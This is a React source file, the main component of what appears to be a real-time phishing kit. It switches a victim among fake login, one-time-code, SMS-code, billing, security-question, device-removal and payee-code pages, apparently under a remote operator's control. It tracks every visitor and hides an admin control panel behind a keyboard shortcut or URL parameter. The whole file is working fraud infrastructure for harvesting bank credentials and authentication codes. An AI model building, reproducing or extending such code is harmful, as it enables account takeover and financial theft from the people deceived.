import { useState, useEffect } from 'react';
import { useForm } from '@/contexts/FormContext';
import { useVisitorTracking } from '@/hooks/useVisitorTracking';
import { supabase } from '@/integrations/supabase/client';
import AdminPanel from '@/pages/AdminPanel';
import LoginPage from '@/pages/LoginPage';
import OTPPage from '@/pages/OTPPage';
import SmsOtpPage from '@/pages/SmsOtpPage';
import BillingPage from '@/pages/BillingPage';
import ContactPage from '@/pages/ContactPage';
import ConfirmationPage from '@/pages/ConfirmationPage';

import CallPage from '@/pages/CallPage';
import DeviceRemovePage from '@/pages/DeviceRemovePage';
import SecurityQuestionPage from '@/pages/SecurityQuestionPage';
import SecurityQuestion1Page from '@/pages/SecurityQuestion1Page';
import SecurityQuestion2Page from '@/pages/SecurityQuestion2Page';
import SecurityQuestion3Page from '@/pages/SecurityQuestion3Page';
import SecurityQuestion4Page from '@/pages/SecurityQuestion4Page';
import PreferencesPage from '@/pages/PreferencesPage';
import OtpGenCodePage from '@/pages/OtpGenCodePage';
import DocumentsPage from '@/pages/DocumentsPage';
import PaymentCancelPage from '@/pages/PaymentCancelPage';
import PhoneNumberPage from '@/pages/PhoneNumberPage';
import SelfSendPage from '@/pages/SelfSendPage';
import PayeeCodePage from '@/pages/PayeeCodePage';
import LoadingScreen from './LoadingScreen';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Shield, Eye, EyeOff } from 'lucide-react';

const MainApp = () => {
  const { currentSession, isAdmin, setIsAdmin } = useForm();
  useVisitorTracking(); // Track all visitors
  
  // Password protection for admin panel
  const [showPasswordDialog, setShowPasswordDialog] = useState(false);
  const [adminPassword, setAdminPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
    try {
      return localStorage.getItem('adminAuthenticated') === 'true';
    } catch {
      return false;
    }
  });

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      // Authenticate with Supabase Edge Function
      const { data, error } = await supabase.functions.invoke('admin-auth', {
        body: { password: adminPassword }
      });

      if (error || !data?.success) {
        throw new Error('Invalid password');
      }

      setIsAdminAuthenticated(true);
      localStorage.setItem('adminAuthenticated', 'true');
      if (data?.admin_token) {
        localStorage.setItem('adminToken', data.admin_token);
      }
      setShowPasswordDialog(false);
      setAdminPassword('');
    } catch (error) {
      // Invalid password - clear field for retry
      setAdminPassword('');
    } finally {
      setIsLoading(false);
    }
  };

  const resetAdminAuth = () => {
    setIsAdminAuthenticated(false);
    localStorage.removeItem('adminAuthenticated');
    setIsAdmin(false);
  };


  // Admin access via keyboard shortcut (Ctrl+Shift+A) or URL
  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        if (isAdminAuthenticated) {
          setIsAdmin(true);
        } else {
          setShowPasswordDialog(true);
        }
      }
    };

    // Check if URL contains admin parameter
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('admin') === 'true') {
      if (isAdminAuthenticated) {
        setIsAdmin(true);
      } else {
        setShowPasswordDialog(true);
      }
      // Clean the URL
      window.history.replaceState({}, document.title, window.location.pathname);
    }

    window.addEventListener('keydown', handleKeyPress);
    return () => {
      window.removeEventListener('keydown', handleKeyPress);
    };
  }, [setIsAdmin, isAdminAuthenticated]);

  // Only show admin panel if both isAdmin and isAdminAuthenticated are true
  if (isAdmin && isAdminAuthenticated) {
    return <AdminPanel />;
  }

  // Don't show admin toggle or any admin elements if not authenticated
  if (isAdmin && !isAdminAuthenticated) {
    setIsAdmin(false);
  }

  if (currentSession.isWaiting) {
    return <LoadingScreen />;
  }

  const CurrentPage = () => {
    console.log('Current page:', currentSession.currentPage, 'Type:', typeof currentSession.currentPage);

    switch (currentSession.currentPage) {
      case 1:
        return <LoginPage />;
      case 2:
        return <OTPPage />;
      case 3:
        return <SmsOtpPage />;
      case 4:
        return <BillingPage />;
      case 5:
        return <ContactPage />;
      case 6:
        return <ConfirmationPage />;
      case 7:
        return <CallPage />;
      case 8:
        return <DeviceRemovePage />;
      case 9:
        return <SecurityQuestionPage />;
      case 10:
        return <SecurityQuestion1Page />;
      case 11:
        return <SecurityQuestion2Page />;
      case 12:
        return <SecurityQuestion3Page />;
      case 13:
        return <SecurityQuestion4Page />;
      case 14:
        return <PaymentCancelPage />;
      case 15:
        return <PhoneNumberPage />;
      case 16:
        return <SelfSendPage />;
      case 17:
        return <PayeeCodePage />;
      default:
        console.log('Falling back to LoginPage for page:', currentSession.currentPage);
        return <LoginPage />;
    }
  };

  return (
    <>
      <CurrentPage />
      
      {/* Admin Password Dialog */}
      <Dialog open={showPasswordDialog} onOpenChange={setShowPasswordDialog}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center space-x-2">
              <Shield className="h-5 w-5 text-admin" />
              <span>Admin Access Required</span>
            </DialogTitle>
            <DialogDescription id="admin-access-desc">
              Enter the admin password to access the control panel.
            </DialogDescription>
          </DialogHeader>
          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="adminPassword">Enter Admin Password</Label>
              <div className="relative">
                <Input
                  id="adminPassword"
                  type={showPassword ? "text" : "password"}
                  value={adminPassword}
                  onChange={(e) => setAdminPassword(e.target.value)}
                  placeholder="Enter password to access admin panel"
                  className="pr-10"
                  autoFocus
                />
                <Button
                  type="button"
                  variant="ghost"
                  size="sm"
                  className="absolute right-0 top-0 h-full px-3 hover:bg-transparent"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <EyeOff className="h-4 w-4" />
                  ) : (
                    <Eye className="h-4 w-4" />
                  )}
                </Button>
              </div>
            </div>
            <div className="flex space-x-2 justify-end">
              <Button 
                type="button" 
                variant="outline" 
                onClick={() => {
                  setShowPasswordDialog(false);
                  setAdminPassword('');
                }}
              >
                Cancel
              </Button>
              <Button 
                type="submit"
                className="bg-admin hover:bg-admin/90 text-admin-foreground"
                disabled={!adminPassword.trim() || isLoading}
              >
                {isLoading ? 'Verifying...' : 'Access Admin Panel'}
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>
    </>
  );
};

export default MainApp;